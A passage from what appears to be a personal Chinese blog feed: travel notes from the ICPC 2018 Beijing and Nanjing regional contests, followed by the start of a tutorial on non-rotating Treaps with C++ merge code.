<p><img src="/posts/life/icpc-2018-asia-beijing-regional-travel-notes/four_balloons.jpg" alt="四只气球"></p>
<p>比赛结束后立马就是游戏对抗赛（Botzone 上的坦克大战）。前期多场平局让我们意识到不仅人是复读机，坦克也是。</p>
<p>经过各种冗长的发言后最终来到了颁奖环节。我一直在狂奶搞不好是铜首（羞愧），感觉把队友演了。但是心里一想前面有很多北大打星队说不定运气好还能搞个银尾。在滚榜环节我各种瞎奶 “这个肯定 A 了”、“封榜后只交了一次肯定代表 A 了”、“封榜后交了那么多次一定 A 了”，多数都被打脸。亲自滚榜的黄教授也被疯狂打脸 233333。一直滚到前 $50$ 的时候都没出现我们队，我心里顿觉充满希望。然而好景不长…… 在 $47$ 名的位置我们出现了…… 然后铜牌线华丽丽地划在了 $46$ 上方。 What？ 铜牌第二？QAQ！凉了，我把队友演了。要是少交一点点罚时肯定就银了啊 QAAAQ！其实，虽然自己在来北京前对拿牌并没有抱太大希望，但是最后知道这一结果后心里却又有一点点小难过…… 人们总是遗憾于自己本可以做到却只是差一点点没能做到的事情 QAQ。</p>
<p><a href="https://web.archive.org/web/20181112004553/http://icpc.hihocoder.com/">ICPC 2018 亚洲区预赛北京站 终榜</a></p>
<p>感觉要被队友打死。</p>
<p>面无表情地上台领 (bei) 牌 (guo)。<strong>反思自己的确是平时太不注重罚时，这也算是给自己一次深刻的教训</strong>。</p>
<p>出体育馆后上了商汤的车，前往商汤科技总部骗吃骗喝。提问环节抽锦鲤第二轮就抽中了 Hanano 大佬（超强）23333。清北的那几位大佬都好强啊orz。商汤提供的自助餐有各种 Pizza、烤鸡、炸鸡、汉堡、寿司、培根、慕斯蛋糕、布丁、水果拼盘…… 甚至还有 Rio 喝。真是十分丰盛。在听完宣讲后出来还发现多了 KFC，于是当场 “吃不了，兜着走” 顺了一个汉堡（捂脸）。</p>
<p>在商汤海吃一顿后心情好了些，回宾馆后随便看了看南方公园消遣了一番就睡觉了。</p>
<h1 id="day-3">Day 3</h1>
<p>早上返程…… 再一次经过了徐州、南京，然后就滚回学校了。心里一想之前签过假条顺势就把晚上的课一并翘了。听说概率论半期考试很简单没去考感觉血亏 QAQ。今年的比赛到此就算结束了，打算再抽个时间写一篇认真的总结，但是感觉自己多半会咕……（我期末不想挂科 QAQ）。</p>
]]></content>
		</item>
		
		<item>
			<title>ICPC 2018 亚洲区域赛南京站游记</title>
			<link>https://codgician.me/zh-hans/posts/2018/10/icpc-2018-asia-nanjing-regional-travel-notes/</link>
			<pubDate>Tue, 16 Oct 2018 22:50:35 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/10/icpc-2018-asia-nanjing-regional-travel-notes/</guid>
			<description>Day 0 国庆六场模拟赛场场自闭，导致比赛前一周状态不佳。抱着打铁的心态随便整理了一下模板。本来打算当天就整理好并打出来的结果转念一想去南航找复印</description>
			<content type="html"><![CDATA[<h1 id="day-0">Day 0</h1>
<p>国庆六场模拟赛场场自闭，导致比赛前一周状态不佳。抱着打铁的心态随便整理了一下模板。本来打算当天就整理好并打出来的结果转念一想去南航找复印店应该很容易（好一个 FLAG）所以就咕咕咕了。晚上听 BinGoo0o0o 巨佬讲了一些很高深的树形背包问题的变形（貌似并没有太听懂 QAQ），然后和队友胡乱吹了一波水，就心安理得地滚回宿舍睡觉了。</p>
<h1 id="day-1">Day 1</h1>
<p>早上起不来啊…… 好困啊…… 结果头天都说要咕咕咕的队友来得都比我早。</p>
<p>高铁好评。尝试在高铁上用 Surface 最后 rush 一下模板，结果前面那个人突然把作为猛地往前一调我 Surface 就不见了…… 还好没悲剧。于是接下来我都没敢用电脑了，就看了一会儿小说。南航离火车站之隔一站地铁…… 然而我感觉在地铁站里面走花的时间比坐地铁还久。</p>
<p>一出地铁就看到南航方向飞来一架直升机…… 然后又来一架…… 然后又是一架…… 果然南航，好强啊。进学校看横幅才知道貌似刚好赶上了一个 “南航 · 昌飞” 直升机主题招聘日，并且打出了 “您的专机已就位！AC311 乘机体验，让我们带你一起飞” 的标语。虽然很想坐直升机，但转念一想身边两位队友就已经可以带我飞了，所以也没什么关系了。照片不出意外地拍残了：</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/helicopter_event.jpg" alt="您的专机已就位! AC311 乘机体验，让我们带你一起飞"></p>
<p>一群人迷路若干次绕了一大圈才找到体育馆。报道时发现南航慷慨地给了三张 20 元的餐券。去南航的网红食堂 “航空餐厅” 吃了午饭…… 拿了一堆菜以为要超额度结果离额度差不少（后悔 QAQ）。反正南航的伙食我吹爆，又便宜又好吃，有这食堂还订什么外卖……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/nuaa_cafeteria.jpg" alt="航空餐厅我吹爆"></p>
<hr>
<p>吃完饭后去体育馆就可以碰到电脑了。南航的体育馆好气派啊……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/nuaa_gymnasium.jpg" alt="体育馆"></p>
<p>到现场发现高中大佬学长就坐在对面的位置 orzzzzz。看比赛手册以为是带 Unity 桌面环境的 Ubuntu 16.04 LTS，结果到手发现是 xfce 桌面环境的 Xubuntu，连 gedit 都没有。另外我们发现电脑巨卡 QAQ。Hanano 尝试在 Code::Blocks 里瞎写一些东西，然后发现有一定几率写一半电脑突然卡住，过几秒才好 QAQ。接着我们又发现，Code::Blocks 执行编译好程序的默认终端是 xterm，而 xterm 连复制粘贴都不行。我们尝试把其改成 xfce-terminal, 结果发现一改在 Code::Blocks 里保存代码的时候就会跳 Exception，然后一点 stop 就闪退…… 心态崩了 QAQ。</p>
<p>下午简短的开幕式完了后就开始了热身赛，还没有打印模板的我心里慌慌的。热身赛一开始，打开 PC^2，输入账号，输入密码，Invalid Password。再输一遍，Invalid Password。两个队友轮流输，Invalid Password。结果后面才知道主办方 PC^2 出锅了…… 那就看题吧。结果拿到题册一看，全都没有时限/空间限制？PC^2 上也没写，这可还行。Hanano 大佬一眼秒 B 题（分别按照 $x, y, z$ 排序并将相邻点间连边建图再在图上跑最小生成树即可）。Hanano 写完 B 题正感叹交不了题的时候，主办方突然表示解决掉 PC^2 的锅了：将每个账户的密码重置为跟账户名一样。可还行。刚交完 B 题，我们发现 PC^2 里看不到评测队列并且半天没等到结果，我就提议看看榜单。结果一开 Firefox，整个电脑就卡死了…… 我们等了十分钟后发现电脑还没反应就召唤来了现场志愿者小姐姐，接着志愿者小姐姐又召唤来了志愿者小哥哥，帮我们进行了强制重启大法，解决了这一问题。我背锅我背锅，再也不敢看榜单了呜呜呜。直到小姐姐送来了气球我们才知道 B 题过了，Hanano 好强啊 QAQ。</p>
<p>接下来 nbfynbfy 大佬很快也推出了 C 题公式，好强啊 QAQ。电脑恢复正常后 nbfynbfy 写了 C 题，我给 nbfynbfy 提供了预处理阶乘逆元并 $\mathcal{O}(1)$ 求组合数的写法后也 1 发 AC 了。接着在我卡 D 题的时候 Hanano 决定试试环境而本垃圾一眼秒 A 题，然后发现 A 题看漏了一个条件…… 然后就做不来了…… 于是我就去开 D 题了。</p>
<p>在主办方表示除 <code>Desktop</code> 以外其他地方存文件可以保留下来的时候，Hanano 就决定玩玩 <code>vimrc</code> 啦…… 他一顿操作猛如虎写下了自己的 <code>vimrc</code>，却发现无论如何也加载不上去…… 知道我查到可以使用 <code>-u</code> 指令加载自定义配置文件后，他才发现自己 <code>vimrc</code> 写挂了…… 然后搞了半天终于调好了，并保存在了非 <code>Desktop</code> 目录下，然后美滋滋地让我瞎搞 D 题。</p>
<p>我 D 题考虑如果使用类似树状数组的数据结构的话，区间修改是只跟左端点和右端点 $+ 1$ 有关的，因此可以考虑首先读入询问并离散化所有左端点和右端点 $+ 1$ 来把 $10^9$ 的神仙数据范围降到 $10^5$。然而写了一半才意识到区间修改实现有一处细节考虑错了…… 然后就凉了做不来了。一道题都没做，划了三小时水，好羞愧呜呜呜。</p>
<p>赛后群里 Claris 表示我只看了 A 和 D 不都是 BZOJ 原题吗…… 瑟瑟发抖（分别是 BZOJ 2345 和 BZOJ 1938）。A 题面出锅了…… 原题是 V 船可以随意乱走但是热身赛题面说的是 V 船必须与 Y 船按照同样的方式走…… 醉了啊。要是是前者题意的话就是一道大水题。听说主办方为 A 题准备了 $300$ 多个气球最后只发出了不到 $10$ 个，哈哈哈。而至于 D​ 题，大致是先要用一些数学变换把修改操作转化为可以用树状数组或是线段树维护的修改操作，再像我那样离散化区间端点…… 嘤嘤嘤我开了什么神仙题啊，不过有空还是想补补这道题……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/warm_up.jpg" alt="热身赛现场"></p>
<hr>
<p>Hanano 表示 NUAA 的餐券好好看啊想留一张。我觉得大佬说的很有道理，于是我们去吃了汉堡王…… 然而吃的有些慢，一不小心就把学长咕了，呜呜呜。晚上路过南航停机坪时顺便偷拍了一架直升机……</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/helicopter.jpg" alt="黑夜中的直升机"></p>
<p>去了宾馆，终于不是一晚上 $30$ 元一人的那种了，感觉超棒。在宾馆里最后修改了一下模板就跑回南航里找打印店了（要是没有模板我怕是要被队友打死 QAQ）。南航好大啊 QAQ。找了半天才找到打印店。打印好模板后站在南航里跨公路天桥上看了一会儿车水马龙…… 感觉莫名平静，另外就是感觉我读了一个假大学。</p>
<h1 id="day-2">Day 2</h1>
<p>房间里开了二十度的空调还能有蚊子…… 也是醉了。</p>
<p>七点过爬起来后在酒店吃完早餐就上路了。回到体育馆一看，什么都没了（包括前一天调了半天写好的 <code>vimrc</code>），于是 Hanano 一气之下就决定用 Code::Blocks 了。不过还好，今天电脑基本不卡了，而且修改默认终端也不会报错了。</p>
<p>本来以为有倒计时的（连热身赛都有倒计时），结果比赛突然说开始就开始了。题册按照惯例也没有时间限制空间限制，主办方在 PC^2 里发了个 Clarification 才把时限告知参赛选手…… 不过貌似还是没有空间限制。前一天听学长说貌似 PC^2 不会返回 Memory Limit Exceeded，所以貌似可以放心大胆瞎搞？问题不大。</p>
<p>按照惯例，nbfynbfy 从头看， Hanano 从中间看（F 题信仰），我从后往前看。我一看最后一题，回文树？打扰了。此时 nbfynbfy 貌似一眼秒了 A 题并开始敲代码了。他火速敲完后说是一个裸 Nim 博弈，我简单晃了一眼题貌似是的就让他交了…… 然后 Wrong Answer。然后我脑抽地问了一句会不会是多组数据…… 然后又交…… 又一发 Wrong Answer。于是我又仔细读了一遍题，发现看掉一个条件…… 一次取石头只能取一段连续区间。给 nbfynbfy 说了后心态有点小崩，然后就留下他继续想 A 我先去看 B 题了（我博弈很菜的 QAQ）。看完 B 题后发现没什么思路，这个时候看了一眼榜发现怎么大家都会 A 题啊 QAQ，然后 J 题也有人过，于是我就又去看了看 J 题，发现没有什么思路，只知道质因数肯定是要分解的，于是本垃圾心态更崩了。这个时候 Hanano 拉着我一起想 C 题。简单想了想没什么思路，我就决定先去跟 nbfynbfy 搞 A 题了（此时已经过了一片了）。然而这个时候志愿者小姐姐突然送给我们一只红色气球。Hanano 问道是 A 题过了吗？我懵逼了，难道重测了？再三看了看 PC^2 里的评测结果和榜单确认我们还依然处于签到失败的状态…… orz 看起来是气球发错了 QAQ。nbfynbfy 问我 $k + 3$ 是不是必败态，我仔细想了想发现不是…… 然后我们很快发现先手必胜的情况好多啊…… 会不会一定是必胜呢？简单想了想发现只要先手一来从中间取一段使得剩下两段长度相同的连续区间，然后接下来对方怎么取就跟着怎么取就一定必胜了…… 不过还要特判一下 $k = 1$ 的情况，因为 $k = 1$ 且 $n$ 为偶数时先手无法搞出长度相同的两段连续区间。于是我瞎写了几行交上去终于 Accepted 了。签到花了四十分钟嘤嘤嘤，而且一来就两百多名，充满了打铁气息。</p>
<p>接下来我们赶忙去看 J 题。nbfynbfy 提出了一种复杂度 $\mathcal{O}(n\log{n})$ 的神仙做法但是给我和 Hanano 讲的时候我们都一时没有理解（nbfynbfy！），于是就让 nbfynbfy 将就 Hanano 写好的素数筛和质因数分解直接上了。nbfynbfy 一顿操作猛如虎便过了样例，然后交上去后 PC^2 表示 Time Limit Exceeded。于是我们一起看了看代码，我首先发现 Hanano 写的是 $\mathcal{O}(n\log^2{n})$ 的埃氏筛，于是要求改成线性筛再交一发…… 继续 Time Limit Exceeded。我心态有些小崩，明明都总算 $\mathcal{O}(n\log{n})$ 了怎么还不让过 QAQ。我把目光转向了质因数分解部分，发现 Hanano 写的是 $\mathcal{O}(\frac{n}{\log{n}})$ 的质因数分解（即试除终止条件为 <code>primes[j] &lt;= n</code>），这勾起了我 Codeforces 上某场疯狂 TLE 一小时的惨痛回忆，于是顺手改成了 $\mathcal{O}(\frac{\sqrt{n}}{\log{\sqrt{n}}})$ 的质因数分解（即试除终止条件为 <code>primes[j] * primes[j] &lt;= n</code>），这样一来预处理素数的范围也可以改小一点了，然后再交一发…… 竟然 Accepted！开心（这算卡常吗 QAQ……）~</p>
<p>我们看了一眼榜，发现 I 题过的人挺多的（另外就是发现自己还在铁牌区 QAQ），于是我就去看 I 题了。我题还没读完 nbfynbfy 就大叫一声二分图（好强啊 QAQ），我一看有道理不过这个直接二分图匹配不好做要用网络流。与 Hanano 讨论了建图后发现自己之前把一个人拆成两个点的建法存在 TLE 风险…… 于是自己就考虑直接超级源点到源点容量限成 $n + k$，然后源点到每个人边容量设成 $2$ 来建。于是我上去写这道题，Hanano 和 nbfynbfy 一起去看 G 题了。我敲了半天 Dinic 板子并写好后样例一遍过，然而提交却 Wrong Answer 了。我的第一反应是会不会模板抄错了，检查了半天也没发现问题。这个时候 Hanano 过来帮我看了一看表示我建图存在漏洞…… 不应该只设一个源点限制 $n + k$，应当建两个源点一个限制 $n$ 一个限制 $k$，因为前者可能导致实际上有多于 $k$ 人服药。我一想好有道理啊，然后改了改交上去就 Accepted 了。贡献了一发罚时好羞愧 QAQ，Hanano 好强啊。</p>
<p>接下来我们就一起去看 G 了，Hanano 和 nbfynbfy 貌似已经人肉打表并发现一个公式了（疯狂膜队友），Hanano 用电脑上的 Python 进行了简要验算后就开始尝试化简式子了，然而化简了好久貌似都有一些问题（in the meantime 本垃圾由于什么都不会就只好帮大佬队友做人肉验算）。最后 nbfynbfy 进行一顿化简后大叫，这不就是组合数 $\binom{n + 3}{4}$ 吗…… 我们验算了 $n = 1 \sim 5$ 发现全都是对的，然后 Hanano 就说不如偷个懒直接用 Python 随手写一个交一发试试看（直接用内置高精度就懒得算逆元了）。在等待 PC^2 返回结果时 Hanano 表示要是 TLE 了就好玩了…… 然后若干秒后真的 Time Limit Exceeded 了。一口好奶，真是笑死在现场。于是我们只好灰溜溜地又用 C++ 写…… 然后就 Accepted 了。队友太强了 ooorrrz！</p>
<p>此时我们过了四题，大概位于铜牌区。不过这时大概就差不多要封榜了。我们看 D 题和 K 题过的人比较多，就决定最后一个小时主要看这两道题。D 题我看完题目就有二分答案的想法，不过如何判断答案是一个问题 —— 以给定所有点为球心作半径为 $R$ 的球并判断这些球是否相交于同一区域。开始我以为只要这些球两两相交就可以了，但是 Hanano 写出来后发现第二个样例没过，在纸上画了画才意识到这样子是不行的。然后 Hanano 就感叹道有没有最小球覆盖的算法啊…… 此时 nbfynbfy 掏出了他携带的一大堆书，并在红书上真的翻到了最小球覆盖问题的模板，好强啊 QAQ。比赛前还一直跟他说带这么多书没什么卵用的我此刻也只能说真香了。Hanano 表示这个模板码风好辣鸡啊然后二话不说开始打模板。于是我和 nbfynbfy 就一起去看 K 题了。</p>
<p>在此期间发生了几件有趣的事情…… 突然我们的 PC^2 都被登出了，不久后主持人表示评测姬出了一些问题正在修锅。几分钟后主持人表示评测姬好了并且比赛会延长 $5$ 分钟。接下来，主持人幽幽地来了一句，大家不要提交大文件，刚刚就是有个队提交了一个一百多兆的打表代码把评测姬卡爆了…… 现场一片大笑哈哈哈哈哈。可是没过多久后我们的 PC^2 却又被登出了，主持人再次表示正在修锅，几分钟后主持人又表示比赛再延长 $5$ 分钟，也就是总共延长 $10$ 分钟。这次主持人没有表示出锅原因，赛后我才听说好像是某个队伍疯狂提交 <code>rand</code> 导致评测姬负荷量过大卡掉了。</p>
<p>我和 nbfynbfy 讨论了 K 题后发现一个很大的问题 —— 做不来 QAQ。于是我提议不妨去看看 B 题，然而对于 B 题我们貌似也没什么思路。看了看表只剩二十分钟左右了，感觉再开新题已经不现实了，于是我们开始就围观 Hanano 巨佬敲代码了。Hanano 火速敲完代码便遇到了一堆编译错误…… 结果发现全是手误。修完编译错误后一跑样例，发现样例全挂了，心态打崩。于是我立马让 Hanano 把他的代码打印出来然后三个人一起帮 Hanano 查错。我帮 Hanano 查出了两处手误后 Hanano 发现样例还是过不了。这个时候离比赛结束已经不到 10 分钟了。我再次反复检查了一遍 Hanano 的代码，并没有发现什么其它错误。这个时候 nbfynbfy 表示会不会是书上模板是 <code>int</code> 而我们应该用 <code>double</code> 的问题…… 然后 Hanano 立马改了改，发现样例过了，于是立马提交。不过看起来这个时候大家都在疯狂提交，评测很慢很慢。于是为了保险起见，我让 Hanano 把 <code>eps</code> 为 $10^{-4}$ 到 $10^{-7}$ 的代码全部都交了一遍。接下来剩下的几分钟我们也没什么事情干了，之后看着评测队列。然而，比赛结束后还是没有返回评测结果，咕咕咕 QAQ。</p>
<p>于是我们终于打开了午餐盒，开始边吃边等待评测结果。这个时候我打开了手机看到 Changer-qyz 发了句祝贺，然后我懵逼地表示我们还等着看自己的滚榜哈哈哈。然后大约十分钟后屏幕上突然跳出一行绿色的 Accepted，我们沸腾了，然后进入疯狂膜 Hanano 绝杀大佬的模式。奇怪的是后提交的反而被先评测了，我们立即打开手机进行拍照留念。</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/the_last_minute_kill.jpg" alt="Hanano 大佬的最后绝杀"></p>
<p>这感觉有点像今年 WF 上 PKU 队最后四分钟绝杀那道计算几何一样…… 只不过他们比赛中就知道结果了，而我们比赛后才知道。接下来屏幕上又弹了三次绿色的 Accepted，每弹一次我们就膜一次 Hanano。然而当我们稍微冷静下来分析一波时，才意识到这大概就是从铜尾翻到铜首的区别，拿比例算一算拿银还是凉凉。于是我们开始焦急地等待滚榜环节。在此期间我们不要脸地从隔壁队伍偷偷借来了一只 D 题的黄色气球插在自己队伍的牌子上并拍了一张照片。</p>
<p><img src="/posts/life/icpc-2018-asia-nanjing-regional-travel-notes/five_balloons.jpg" alt="五只气球"></p>
<p>听说由于 PC^2 炸了工作人员需要手动核榜，所以咕了我们一会儿（工作人员辛苦了 QAQ）。滚榜时屏幕上直接出现了最终榜单，并直接以滚动的形式播放（这可还行，重新定义了滚榜）。眼尖的 nbfynbfy 突然表示看到我们在银尾区，等到终榜再一次滚动到银牌区时我们才确认了这一事实，然后我们又进入了疯狂膜 Hanano 绝杀大佬的模式。简直两位大佬带我飞啊 QAQ。前一段时间的疲倦怠意仿佛在此刻一扫而尽，心中只剩下一种纯净的幸运感与快乐。</p>
<p><a href="https://web.archive.org/web/20181016135153/https://board.summershrimp.com/">ICPC 2018 亚洲区域赛南京站 终榜</a></p>
<p>我们把绝杀大佬 Hanano 推上去领牌了并对他进行了疯狂拍摄（这里就不上图片了，逃）。</p>
<p>晚上以“去南京吃北京烤鸭，去北京吃南京盐水鸭”的心态去吃了北京烤鸭，然而吃的有些慢差点又把学长咕了。晚上直到到高铁上想听点音乐才发现本垃圾一不小心把耳机扔宾馆了 QAQ，可以说是乐极生悲了orz。接着就滚回学校赶作业了（貌似一不小心就欠了某大佬一顿饭，早知道不嘴贱了 QAQ）。</p>
]]></content>
		</item>
		
		<item>
			<title>浅谈无旋转 Treap</title>
			<link>https://codgician.me/zh-hans/posts/2018/07/treap-without-rotations/</link>
			<pubDate>Sat, 28 Jul 2018 15:15:01 +0800</pubDate>
			
			<guid>https://codgician.me/zh-hans/posts/2018/07/treap-without-rotations/</guid>
			<description>简介 Treap = Tree + Heap。Treap 是一种弱平衡的二叉搜索树。 相较普通的二叉搜索树，平衡二叉树与之最显著的区别就是后者是 “平衡的”，即采取了一些</description>
			<content type="html"><![CDATA[<h1 id="简介">简介</h1>
<p><strong>Treap = Tree + Heap</strong>。Treap 是一种<strong>弱平衡</strong>的二叉搜索树。</p>
<p>相较普通的二叉搜索树，平衡二叉树与之最显著的区别就是后者是 “平衡的”，即采取了一些措施防止搜索树退化为一条链。严格来说，平衡二叉搜索树要求对于任意节点，左子树和右子树的高度差不可超过 $1$。维护这一性质往往需要各种复杂的旋转，反而可能会带来较大的常数。而弱平衡二叉树虽然不能保证左右子树高度差不超过 $1$，但是可以基本保证树的平衡，难以退化成长链的情况。</p>
<p><strong>Treap 通过二叉堆的性质来维护二叉树的平衡</strong>。一个二叉（小根）堆满足：一个节点的两个儿子的值都小于节点本身。但是这样的规定与二叉搜索树的性质矛盾…… 为了解决这一问题只好让每个节点包含两个键值，其中随机生成的 $\text{rnd}$ 满足二叉堆性质，而要保存的数据 $\text{value}$ 满足二叉搜索树性质。由于主流的随机数生成算法很难出现完全单调的序列，故以此可以保证 Treap “基本平衡“。</p>
<h1 id="无旋转的-treap">无旋转的 Treap</h1>
<h2 id="节点定义">节点定义</h2>
<p>根据前面的描述，我们可以如下定义 Treap 中的节点：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">class</span> <span class="nc">Treap</span> <span class="p">{</span>
<span class="k">public</span><span class="o">:</span>
    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>      <span class="c1">// 当前节点处的值
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">rnd</span><span class="p">;</span>      <span class="c1">// 随机值
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">siz</span><span class="p">;</span>      <span class="c1">// 以当前节点为根子树的大小
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">son</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>   <span class="c1">// 左右儿子的下标
</span><span class="c1"></span><span class="p">};</span>

<span class="n">Treap</span> <span class="n">trp</span><span class="p">[</span><span class="n">SIZE</span><span class="p">];</span>  <span class="c1">// 内存池
</span><span class="c1"></span><span class="kt">int</span> <span class="n">trpPt</span><span class="p">;</span>        <span class="c1">// 内存池中第一个空闲节点的下标
</span></code></pre></div><p>在后文的实现中有一个略微取巧的地方：将 <code>trp[0]</code> 初始化为空节点，因此节点下表应当从 $1$ 开始分配。这样带来的好处是判断节点是否为空的时候更加方便（只需要判断下标是否为 $0$ 就行了）。此外，后文为了让代码更加直观，定义了如下函数：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="cm">/* node(rt): int -&gt; Treap&amp; 获取下标为 rt 的节点信息 */</span>
<span class="n">Treap</span><span class="o">&amp;</span> <span class="n">node</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">trp</span><span class="p">[</span><span class="n">rt</span><span class="p">];</span> <span class="p">}</span>

<span class="cm">/* lson(rt): int -&gt; Treap&amp; 获取下标为 rt 的左儿子节点信息 */</span>
<span class="n">Treap</span><span class="o">&amp;</span> <span class="n">lson</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">trp</span><span class="p">[</span><span class="n">trp</span><span class="p">[</span><span class="n">rt</span><span class="p">].</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]];</span> <span class="p">}</span>

<span class="cm">/* rson(rt): int -&gt; Treap&amp; 获取下标为 rt 的右儿子节点信息 */</span>
<span class="n">Treap</span><span class="o">&amp;</span> <span class="n">rson</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="n">trp</span><span class="p">[</span><span class="n">trp</span><span class="p">[</span><span class="n">rt</span><span class="p">].</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">]];</span> <span class="p">}</span>

<span class="cm">/* maintain(rt): int -&gt; void 更新以 rt 为根的子树大小 */</span>
<span class="kt">void</span> <span class="nf">maintain</span><span class="p">(</span><span class="kt">int</span> <span class="n">rt</span><span class="p">)</span> <span class="p">{</span> <span class="n">node</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">=</span> <span class="n">lson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">+</span> <span class="n">rson</span><span class="p">(</span><span class="n">rt</span><span class="p">).</span><span class="n">siz</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span> <span class="p">}</span>
</code></pre></div><h2 id="核心操作">核心操作</h2>
<p>一般的 Treap 是带有旋转操作的（正如大部分平衡树一样），而无旋转的 Treap 却用巧妙的方式避免了旋转。无旋转 Treap 抽象出了如下两种核心操作：</p>
<ul>
<li>$\text{merge}(A, B)$：合并两棵子树（它们的根节点分别是 $A$ 和 $B$，并且满足 $A$ 中的所有 $\text{value}$ 均小于 $B$ 中的任意 $\text{value}$），复杂度 $\mathcal{O}(\log{n})$；</li>
<li>$\text{split}(T, A, B, k)$：将以 $T$ 为根节点的树分裂为分别以 $A, B$ 为根的两棵子树，其中前者包含 $T$ 中的前 $k$ 小的节点（也可以实现为值小于 $k$ 的节点），后者包含剩余节点。复杂度 $\mathcal{O}(\log{n})$。</li>
</ul>
<p><strong>注意：合并操作的前提是其中一棵 Treap 上的所有键值（即 $\text{value}$）小于另一棵 Treap 上的键值，否则只能启发式合并</strong>！</p>
<p>有了这两个操作，我们就可以实现平衡树的大部分功能了。但在此之前，让我们先来看看如何实现这两个核心函数。</p>
<h3 id="合并">合并</h3>
<p>我们假设现在维护的是满足<strong>小根堆</strong>性质的 Treap，记将被合并的两棵子树的根节点为 $A$ 和 $B$。我们以分治的思想考虑合并。</p>
<p>首先我们考虑 $\text{rnd}$ 应满足小根堆性质，故 $A$ 和 $B$ 中 $\text{rnd}$ 较小的点应当成为另一点的祖先。不妨假设 $A.\text{rnd} &lt; B.\text{rnd}$（反之是同理的），则 $A$ 应当成为 $B$ 的祖先。</p>
<p>接下来考虑 $\text{value}$ 应满足二叉搜索树性质。由于 $A$ 节点原先的左子树中的值一定小于 $B$ 中的值，所以事实上我们只需要合并 $A$ 节点原先的右子树和 $B$。因此我们可以递归下去，也就完成了合并操作。</p>
<p>当然，最后还需要更新一下新的子树大小。</p>
<p>参考代码如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="kt">int</span> <span class="nf">merge</span><span class="p">(</span><span class="kt">int</span> <span class="n">fstRt</span><span class="p">,</span> <span class="kt">int</span> <span class="n">sndRt</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fstRt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">sndRt</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sndRt</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">fstRt</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">fstRt</span><span class="p">).</span><span class="n">rnd</span> <span class="o">&lt;</span> <span class="n">node</span><span class="p">(</span><span class="n">sndRt</span><span class="p">).</span><span class="n">rnd</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">node</span><span class="p">(</span><span class="n">fstRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">merge</span><span class="p">(</span><span class="n">node</span><span class="p">(</span><span class="n">fstRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sndRt</span><span class="p">);</span>
        <span class="n">maintain</span><span class="p">(</span><span class="n">fstRt</span><span class="p">);</span> 
        <span class="k">return</span> <span class="n">fstRt</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">node</span><span class="p">(</span><span class="n">sndRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">merge</span><span class="p">(</span><span class="n">fstRt</span><span class="p">,</span> <span class="n">node</span><span class="p">(</span><span class="n">sndRt</span><span class="p">).</span><span class="n">son</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
        <span class="n">maintain</span><span class="p">(</span><span class="n">sndRt</span><span class="p">);</span> 
        <span class="k">return</span> <span class="n">sndRt</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><h3 id="分裂">分裂</h3>
<p>分裂其实有两种方式：</p>
<ul>
<li>按排名分裂：前 $k$ 小的数构成一棵子树，剩余的构成另一棵；</li>
<li>按权值分裂：小于等于 $k$ 的数构成一棵子树，剩余的构成另一棵。</li>
</ul>
<p>接下来我们主要演示按排名分裂（按权值分裂基本同理），其实现也基于分治思想。</p>
<p>对于以 $T$ 为根的树，我们首先要考虑根要被拆分到值较小的左子树 $A$ 还是值较大的右子树 $B$ 去。如果当前左子树的大小大于等于 $k$，则说明 $T$ 以及其右子树都是应当被分到 $B$ 中去的。那我们不妨先把 $T$ 当作 $B$。接下来的问题就是要在 $B$ 的中继续分裂出前 $k$ 小的值给 $A$。因此我们递归地调用下去就好了。</p>
<p>而如果 $T$ 的左子树大小小于 $k$，则说明整个左子树都应该给 $A$。类似地，不妨把 $T$ 当作 $A$，然后递归地在 $A$ 中分裂出前 $k - \text{左子树大小}$ 的值给 $B$ 就好了。</p>
<p>最后不要忘了需要更新新的子树大小。</p>
<p>参考代码如下：</p>
